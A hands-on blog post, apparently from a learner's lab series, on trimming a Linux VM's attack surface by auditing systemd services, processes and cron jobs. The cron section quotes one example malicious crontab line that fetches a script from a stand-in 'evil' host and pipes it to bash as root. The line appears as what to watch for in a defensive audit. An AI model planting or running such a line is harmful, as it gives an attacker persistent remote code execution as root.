---
title: "Trimming a Linux Server's Attack Surface: Services, Processes & Cron"
date: 2026-07-27 04:24:00 +0500
permalink: /posts/linux-attack-surface-reduction/
categories: [Hands-On, Linux Security]
tags: [linux, hardening, systemd, services, cron, attack-surface, beginner]
---

The next task on the sheet was about **attack surface** — the idea that every service running and every task scheduled on a server is code that could be exploited or abused, so a secure server runs *only what it actually needs*. My job: review everything running on the box, justify what stays, and remove what doesn't. Same lab VM as before. This one taught me how to read a running system, and — honestly — where the edges of my own knowledge still are.

## Running vs enabled: not the same thing

The first thing I had to get straight is that "running now" and "starts at boot" are two different states:

```bash
systemctl list-units --type=service --state=running     # running right now
systemctl list-unit-files --type=service --state=enabled # starts at boot
```

The running list had **14** services. The enabled list had **45**. That gap confused me until I realised most of those 45 are **one-shot** boot services — they run *once* at startup (set up the keyboard, configure the network, generate SSH keys), do their job, and exit. They're "enabled" but never show up as "running" because they're not persistent daemons. So 45 enabled ≠ 45 things sitting there as attack surface.

This distinction matters for a practical reason: if you *stop* a service but don't *disable* it, it just comes back on the next reboot. To actually shrink the attack surface you have to disable the ones set to start at boot.

## Where I hit the edge of what I know

Then came the honest part. The enabled list was full of services I couldn't confidently judge — `pollinate`, `open-iscsi`, `thermald`, `blk-availability`. Reading `systemctl status` tells you if something is *active*, but not whether the server actually *needs* it. That's experience, not something you can grep.

So instead of pretending, I worked out a **framework** I could actually apply. This box is a **virtual, headless, apt-managed** server. That immediately tells you what's dead weight:

- Anything for **physical hardware** → unnecessary. `thermald` manages CPU temperature, but this is a VM — the *host* controls real thermals. `gpu-manager` configures GPU drivers, but there's no display.
- Anything for **storage you don't use** → unnecessary. `open-iscsi` connects to network storage (SANs); this VM has a local disk. (Same logic I'd already used to drop `multipathd`.)
- Anything for **package systems you don't use** → unnecessary. `snapd` is the snap daemon; I install everything with `apt` and use no snaps, and it's a large always-on service that auto-updates over the network.

Meanwhile the **core** services — `ssh`, `cron`, logging (`rsyslog`, `journald`), the firewall (`ufw`), `apparmor`, time sync (`chrony`), networking — obviously stay. The lesson: you don't need to memorise every service; you need to know the server's *role*, and judge each service against it.

## Reading the process list

Next I looked at what's actually running as processes:

```bash
ps aux --sort=-%cpu | head
ps aux --sort=-%mem | head
top
```

Two things surprised me. First, the top CPU consumer was… the `ps` command I ran to check — the *observer effect*. On an idle box, the thing measuring activity is briefly the busiest thing on it. Second, most of `ps aux` is **kernel threads** — every entry in `[square brackets]` (`kworker`, `ksoftirqd`, `rcu_*`) isn't a real program; it uses zero memory and belongs to the kernel. You learn to filter those out and look at the ~18 real processes, which were all standard system services.

Why does this matter for security? Because malware shows up *here*. A cryptominer that's silently compromised a server can hide its name, but it can't hide from `top` — burning CPU is its entire purpose. A reverse shell or a payload dropped in `/tmp` shows up as a process owned by an unexpected user. **You can't recognise abnormal until you've stared at normal** — so building this boring, idle baseline in my head was the actual point of the exercise.

## Scheduled tasks: the persistence hiding spots

A cron job is automatic persistence: drop one line that runs as root every minute and your access survives even if you're kicked out. So I checked *every* place a task can hide:

- `/etc/crontab`, `/etc/cron.d/`, and the `cron.hourly/daily/weekly/monthly` directories
- **every user's** crontab (`crontab -l -u <user>`), not just my own — a hidden job in another account is a classic blind spot
- systemd **timers** (`systemctl list-timers`), the modern cron

Everything was default: log rotation, `apt` updates, filesystem checks. The cron scripts were all `root:root` and **not world-writable** (a world-writable script that root runs would be a serious finding). No user had a personal crontab. A malicious line would have looked like `* * * * * root curl http://evil/x.sh | bash` — none of that here. An honest, clean result.

## Trimming — and the difference between disable and mask

Finally, the action. I disabled the services I'd justified:

```bash
sudo systemctl disable --now thermald gpu-manager open-iscsi apport
```

`snapd` needed extra care. When I disabled it, systemd warned that its **socket** was still active — meaning the socket would just re-launch snapd on the next connection. That's the difference between two commands I now understand properly:

- **`disable`** stops a service starting at boot, but it can still be started manually or pulled in by another unit.
- **`mask`** links it to `/dev/null`, making it *impossible* to start — even as a dependency.

So snapd got both:

```bash
sudo systemctl disable --now snapd.service snapd.socket
sudo systemctl mask snapd.service snapd.socket
```

## Prove it still works

The step people skip: I didn't *assume* the box was fine. I checked `systemctl --failed` (zero failed units), then **rebooted and reconnected over SSH**. It came back, every essential service was still active, and the trimmed ones stayed off. A change you haven't verified isn't done — that lesson keeps coming back across every one of these projects.

## Takeaway

Attack-surface reduction isn't glamorous — it's mostly deciding what a server *doesn't* need and turning it off carefully. But it's real hardening: fewer running services means fewer things an attacker can target. And the meta-skill underneath it — knowing what *normal* looks like so *abnormal* jumps out — is the foundation for the next project: log analysis.
